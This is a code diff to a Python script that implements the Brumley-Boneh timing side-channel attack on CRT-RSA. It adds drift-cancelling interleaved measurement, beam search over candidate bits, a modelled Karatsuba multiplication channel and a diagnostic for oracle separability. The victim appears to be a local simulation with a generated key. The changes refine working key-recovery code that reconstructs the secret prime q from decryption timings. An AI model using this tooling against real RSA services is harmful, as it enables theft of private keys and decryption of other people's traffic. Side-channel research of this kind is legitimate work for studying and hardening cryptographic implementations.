@@ -121,6 +121,50 @@ def neighborhood_time(victim, g, radix_inv, n, neigh, sample):
     return total
 
 
+def neighborhood_gap(victim, g, ghi, radix_inv, n, neigh, sample,
+                     interleave=False):
+    """Return the aggregate pair ``(Tg, Tghi)`` used for the zero-one gap.
+
+    ``interleave=False`` (default) reproduces the original behaviour exactly:
+    the whole g-neighborhood is measured first, then the whole ghi-neighborhood
+    (two separate blocks).
+
+    ``interleave=True`` measures ``g+k`` and ``ghi+k`` *back-to-back* for each k
+    (and, when ``sample>1``, alternates the two within the sample loop).  The
+    bit decision depends only on the DIFFERENCE ``Tg - Tghi``, so pairing the
+    two measurements in time makes slow multiplicative drift (unpinned-CPU
+    turbo/thermal frequency wander -- this host's dominant noise, per the work
+    log) a common-mode term that cancels in the difference instead of aliasing
+    into it.  This is a drift-targeted refinement of Brumley-Boneh's own
+    difference-of-neighbourhoods statistic; it does NOT change the decision
+    rule, only the measurement *order*.
+
+    Note: interleaved pairs must be measured fresh (never served from a cache
+    of an earlier depth), otherwise the drift the pairing is meant to cancel is
+    reintroduced -- callers must not memoize across bits when interleaving.
+    """
+    if not interleave:
+        tg = neighborhood_time(victim, g, radix_inv, n, neigh, sample)
+        tghi = neighborhood_time(victim, ghi, radix_inv, n, neigh, sample)
+        return tg, tghi
+
+    tg = tghi = 0.0
+    for k in range(neigh):
+        cg = cipher_for(g + k, radix_inv, n)
+        chi = cipher_for(ghi + k, radix_inv, n)
+        if sample <= 1:
+            tg += victim.measure(cg)
+            tghi += victim.measure(chi)      # measured immediately after cg
+        else:
+            gs, hs = [], []
+            for _ in range(sample):
+                gs.append(victim.measure(cg))
+                hs.append(victim.measure(chi))
+            tg += _median(gs)
+            tghi += _median(hs)
+    return tg, tghi
+
+
 def neighborhood_count(victim, g, radix_inv, n, neigh):
     """Aggregate the *exact* extra-reduction count over a neighborhood.
 
@@ -139,7 +183,7 @@ def neighborhood_count(victim, g, radix_inv, n, neigh):
 # --------------------------------------------------------------------------- #
 def recover_factor(victim, radix_inv, qbits, neigh=64, sample=1,
                    tail_brute=0, adaptive_neigh=True, tau_frac=0.3,
-                   verbose=True):
+                   interleave=False, verbose=True):
     """Recover the top bits of q via the zero-one gap.
 
     Recovers bits qbits-2 .. tail_brute (the top bit is 1 by definition of the
@@ -167,8 +211,8 @@ def recover_factor(victim, radix_inv, qbits, neigh=64, sample=1,
     for idx, i in enumerate(range(qbits - 2, stop_bit - 1, -1)):
         ne = min(neigh, max(1, 1 << i)) if adaptive_neigh else neigh
         ghi = g | (1 << i)
-        tg = neighborhood_time(victim, g, radix_inv, n, ne, sample)
-        tghi = neighborhood_time(victim, ghi, radix_inv, n, ne, sample)
+        tg, tghi = neighborhood_gap(victim, g, ghi, radix_inv, n, ne, sample,
+                                    interleave=interleave)
         delta = tg - tghi
         tau = tau_frac * max_pos_delta      # "large gap" threshold (self-calibrating)
         decided = 0 if delta > tau else 1   # 0-bit => large positive gap
@@ -260,7 +304,7 @@ class _BeamCand:
 
 def recover_factor_beam(victim, radix_inv, qbits, neigh=64, sample=1,
                         tail_brute=0, adaptive_neigh=True, tau_frac=0.3,
-                        beam_width=8, verbose=True):
+                        beam_width=8, interleave=False, verbose=True):
     """Beam / backtracking version of :func:`recover_factor`.
 
     Returns ``(prefix_g, records, q_rec)`` where ``prefix_g``/``records`` belong
@@ -270,6 +314,11 @@ def recover_factor_beam(victim, radix_inv, qbits, neigh=64, sample=1,
 
     ``beam_width == 1`` reduces to the greedy search (with the same decisions),
     so this is a strict generalisation.
+
+    ``interleave`` (see :func:`neighborhood_gap`) measures each candidate's g and
+    ghi neighbourhoods back-to-back so multiplicative drift cancels in the gap;
+    it disables the cross-depth measurement cache (stale cached measurements
+    would reintroduce the very drift the pairing removes).
     """
     n, q = victim.n, victim.q
     stop_bit = tail_brute
@@ -280,6 +329,8 @@ def recover_factor_beam(victim, radix_inv, qbits, neigh=64, sample=1,
     # bit-0 child of one prefix and the bit-1 child of another) can request the
     # same g, and the aggregate depends only on (g, ne).  Keeps the query count
     # from blowing up by the full beam_width where prefixes coincide.
+    # NOTE: this cross-depth cache is only sound WITHOUT interleaving; when
+    # interleaving we must measure each (g, ghi) pair fresh (see neighborhood_gap).
     meas_cache = {}
 
     def measure_g(g, ne):
@@ -297,11 +348,21 @@ def recover_factor_beam(victim, radix_inv, qbits, neigh=64, sample=1,
         actual = (q >> i) & 1
         children = []
         seen = {}                            # dedup children by prefix value g
+        pair_cache = {}                      # per-depth dedup of (g, ghi) pairs
         for cand in beam:
             g = cand.g
             ghi = g | (1 << i)
-            tg = measure_g(g, ne)
-            tghi = measure_g(ghi, ne)
+            if interleave:
+                pkey = (g, ghi)
+                pv = pair_cache.get(pkey)
+                if pv is None:
+                    pv = neighborhood_gap(victim, g, ghi, radix_inv, n, ne,
+                                          sample, interleave=True)
+                    pair_cache[pkey] = pv
+                tg, tghi = pv
+            else:
+                tg = measure_g(g, ne)
+                tghi = measure_g(ghi, ne)
             delta = tg - tghi
             tau = tau_frac * cand.max_pos_delta
             margin = delta - tau
@@ -364,6 +425,86 @@ def recover_factor_beam(victim, radix_inv, qbits, neigh=64, sample=1,
 
     best = max(beam, key=lambda c: c.score)
     return best.g, best.records, q_rec
+
+
+# --------------------------------------------------------------------------- #
+# Oracle-separability diagnostic (block vs interleaved measurement).
+#
+# The recovery accuracy is a poor probe of *measurement quality* because a
+# single early wrong bit derails the greedy chain and everything after is a
+# coin flip.  This diagnostic removes that confound: it walks the KNOWN true q
+# prefix, so at every position the two guesses g/ghi are exactly the "correct
+# prefix above bit i" pair the attacker would face if it had recovered the bits
+# above correctly.  It then measures the zero-one gap delta = T(g) - T(ghi)
+# `trials` times per bit, under BOTH measurement modes back-to-back (paired in
+# time so slow drift hits both equally), and reports how well delta separates
+# the true 0-bits (expected large positive gap) from the true 1-bits (expected
+# ~0 gap).  Higher AUC / effect size = a cleaner oracle.  This is the standard
+# oracle-separability read used by the bundle's other attack families, adapted
+# to the B-B zero-one gap, and it is the correct instrument for the interleave
+# A/B (measures the thing interleave is meant to improve, free of propagation).
+# --------------------------------------------------------------------------- #
+def _auc(pos, neg):
+    """P(random pos-sample > random neg-sample) + 0.5*ties (Mann-Whitney AUC).
+    0.5 = no separation, 1.0 = perfectly separable in the expected direction."""
+    if not pos or not neg:
+        return float("nan")
+    wins = ties = 0
+    for a in pos:
+        for b in neg:
+            if a > b:
+                wins += 1
+            elif a == b:
+                ties += 1
+    return (wins + 0.5 * ties) / (len(pos) * len(neg))
+
+
+def diagnose_gap_separability(victim, radix_inv, qbits, top_bits=20, neigh=48,
+                              sample=1, trials=12, adaptive_neigh=True,
+                              verbose=True):
+    """Per-bit zero-one-gap separability along the TRUE q prefix, comparing
+    block vs interleaved measurement.  Returns a dict of per-mode stats
+    (AUC of 0-bit vs 1-bit gaps, mean gaps, normalised effect size, counts)."""
+    n, q = victim.n, victim.q
+    positions = [i for i in range(qbits - 2, qbits - 2 - top_bits, -1) if i >= 0]
+    modes = ("block", "interleave")
+    coll = {m: {"d0": [], "d1": []} for m in modes}
+
+    t0 = time.perf_counter()
+    for t in range(trials):
+        for i in positions:
+            prefix = (q >> (i + 1)) << (i + 1)   # correct bits ABOVE i
+            g = prefix
+            ghi = prefix | (1 << i)
+            b = (q >> i) & 1
+            ne = min(neigh, max(1, 1 << i)) if adaptive_neigh else neigh
+            for m in modes:                      # both modes, paired in time
+                tg, tghi = neighborhood_gap(victim, g, ghi, radix_inv, n, ne,
+                                            sample, interleave=(m == "interleave"))
+                coll[m]["d1" if b == 1 else "d0"].append(tg - tghi)
+        if verbose:
+            el = time.perf_counter() - t0
+            sys.stdout.write("\r  trial %d/%d | queries %d | elapsed %5.1fs   "
+                             % (t + 1, trials, victim.queries, el))
+            sys.stdout.flush()
+    if verbose:
+        sys.stdout.write("\n")
+
+    def stats(d0, d1):
+        mu0 = _mean(d0) if d0 else float("nan")
+        mu1 = _mean(d1) if d1 else float("nan")
+        pooled = (_std(d0) ** 2 + _std(d1) ** 2) ** 0.5
+        eff = (mu0 - mu1) / pooled if pooled > 0 else float("nan")
+        return {"auc": _auc(d0, d1), "mean_gap_bit0": mu0,
+                "mean_gap_bit1": mu1, "effect_size": eff,
+                "n_bit0": len(d0), "n_bit1": len(d1)}
+
+    out = {"top_bits": top_bits, "neigh": neigh, "sample": sample,
+           "trials": trials, "n_positions": len(positions),
+           "queries": victim.queries}
+    for m in modes:
+        out[m] = stats(coll[m]["d0"], coll[m]["d1"])
+    return out
 
 
 # --------------------------------------------------------------------------- #
@@ -556,8 +697,10 @@ def plot_gap_histogram(records, figs_dir, timing):
 # Orchestration.
 # --------------------------------------------------------------------------- #
 def run(key_bits=256, timing="exact", neigh=64, sample=1, batch=64, repeat=1,
-        recover_bits=None, tail_brute=16, beam_width=1, make_plots=True,
-        use_key_cache=True, results_root=None, cache_root=None, verbose=True):
+        recover_bits=None, tail_brute=16, beam_width=1, interleave=False,
+        karatsuba=False, kara_threshold_limbs=8, kara_gain=1.0,
+        kara_cyc_per_unit=4.0, make_plots=True, use_key_cache=True,
+        results_root=None, cache_root=None, verbose=True):
     """Full attack + characterization + figures + JSON.  Returns results dict."""
     results_root = results_root or os.path.join(_HERE, "bb_results")
     cache_root = cache_root or os.path.join(_HERE, "bb_cache")
@@ -579,7 +722,10 @@ def run(key_bits=256, timing="exact", neigh=64, sample=1, batch=64, repeat=1,
         key = generate_crt_key(key_bits)
         save_crt_key(key_path, key)
 
-    victim = CRTRSAVictim(key, timing=timing, batch=batch, repeat=repeat)
+    victim = CRTRSAVictim(key, timing=timing, batch=batch, repeat=repeat,
+                          karatsuba=karatsuba,
+                          kara_threshold_limbs=kara_threshold_limbs,
+                          kara_gain=kara_gain, kara_cyc_per_unit=kara_cyc_per_unit)
     n = victim.n
     qbits_true = victim.q.bit_length()
     qbits = (n.bit_length() + 1) // 2        # attacker estimate (balanced primes)
@@ -598,6 +744,14 @@ def run(key_bits=256, timing="exact", neigh=64, sample=1, batch=64, repeat=1,
         "  real batch/repeat: %d / %d" % (batch, repeat) if timing == "real"
         else "  (exact oracle: extra-reduction counts, noise-free)",
         "  R^{-1} trick     : submit c = g * R^{-1} mod N (base = g mod q)",
+        "  channel          : %s"
+        % ("extra reduction + Karatsuba/schoolbook mult (gain %.3g, thr %d limbs)"
+           % (kara_gain, kara_threshold_limbs) if karatsuba
+           else "extra reduction only (Schindler)"),
+        "  recovery         : %s%s"
+        % ("beam width %d" % beam_width if (beam_width and beam_width > 1)
+           else "greedy",
+           " | interleaved gap (drift-cancelling)" if interleave else ""),
         "=" * 78,
     ]
     if verbose:
@@ -637,21 +791,24 @@ def run(key_bits=256, timing="exact", neigh=64, sample=1, batch=64, repeat=1,
     tb = stop_bit
     use_beam = beam_width and beam_width > 1
     if verbose:
-        print("[*] recovering q by %s (zero-one gap): "
+        print("[*] recovering q by %s (zero-one gap%s): "
               "bits %d..%d, then brute-force %d low bits"
               % ("beam search (width %d)" % beam_width if use_beam
-                 else "greedy binary search", qbits - 2, stop_bit, tb))
+                 else "greedy binary search",
+                 ", interleaved" if interleave else "",
+                 qbits - 2, stop_bit, tb))
     q_start = time.perf_counter()
     q_rec = None
     if use_beam:
         prefix, records, q_rec = recover_factor_beam(
             victim, radix_inv, qbits, neigh=neigh, sample=sample,
             tail_brute=tb, adaptive_neigh=True, beam_width=beam_width,
-            verbose=verbose)
+            interleave=interleave, verbose=verbose)
     else:
         prefix, records = recover_factor(
             victim, radix_inv, qbits, neigh=neigh, sample=sample,
-            tail_brute=tb, adaptive_neigh=True, verbose=verbose)
+            tail_brute=tb, adaptive_neigh=True, interleave=interleave,
+            verbose=verbose)
     recover_secs = time.perf_counter() - q_start
 
     bits_correct = sum(r["correct"] for r in records)
@@ -691,6 +848,11 @@ def run(key_bits=256, timing="exact", neigh=64, sample=1, batch=64, repeat=1,
             "tail_brute": tb, "adaptive_neigh": True,
             "beam_width": beam_width,
             "recovery": "beam" if use_beam else "greedy",
+            "interleave": interleave,
+            "karatsuba": karatsuba,
+            "kara_threshold_limbs": kara_threshold_limbs,
+            "kara_gain": kara_gain,
+            "kara_cyc_per_unit": kara_cyc_per_unit,
         },
         "modulus_bits": n.bit_length(),
         "qbits_true": qbits_true,
@@ -760,6 +922,18 @@ if __name__ == "__main__":
     BEAM_WIDTH = 1          # 1 = greedy binary search; >1 = confidence beam /
                             #     backtracking (fixes marginal-bit propagation on
                             #     the noisy `real` oracle -- try 8..32)
+    INTERLEAVE = False      # measure g and ghi back-to-back so multiplicative
+                            #     CPU-frequency drift cancels in the zero-one gap
+                            #     (drift-targeted refinement of B-B's difference
+                            #     statistic; toggle to A/B against block mode)
+    KARATSUBA = False       # add B-B's SECOND channel: OpenSSL Karatsuba<->
+                            #     schoolbook multiplication discontinuity (modeled,
+                            #     word-length keyed). Off = pure Schindler core.
+                            #     Karatsuba proper activates at key >= 2*threshold
+                            #     limbs (default 8 limbs/half => 1024-bit RSA).
+    KARA_THRESHOLD_LIMBS = 8    # OpenSSL-style Karatsuba word-count threshold
+    KARA_GAIN = 1.0             # scales the modeled multiplication contribution
+    KARA_CYC_PER_UNIT = 4.0     # real mode: cycles per modeled word-product
     BATCH = 64              # real mode: rdtsc-timed ladders averaged per half
     REPEAT = 1              # real mode: min over this many batch-averages
     MAKE_PLOTS = True
@@ -768,5 +942,7 @@ if __name__ == "__main__":
 
     run(key_bits=KEY_BITS, timing=TIMING, neigh=NEIGHBORHOOD,
         sample=SAMPLE_SIZE, batch=BATCH, repeat=REPEAT, tail_brute=TAIL_BRUTE,
-        beam_width=BEAM_WIDTH, make_plots=MAKE_PLOTS, use_key_cache=USE_KEY_CACHE,
-        verbose=True)
+        beam_width=BEAM_WIDTH, interleave=INTERLEAVE, karatsuba=KARATSUBA,
+        kara_threshold_limbs=KARA_THRESHOLD_LIMBS, kara_gain=KARA_GAIN,
+        kara_cyc_per_unit=KARA_CYC_PER_UNIT, make_plots=MAKE_PLOTS,
+        use_key_cache=USE_KEY_CACHE, verbose=True)
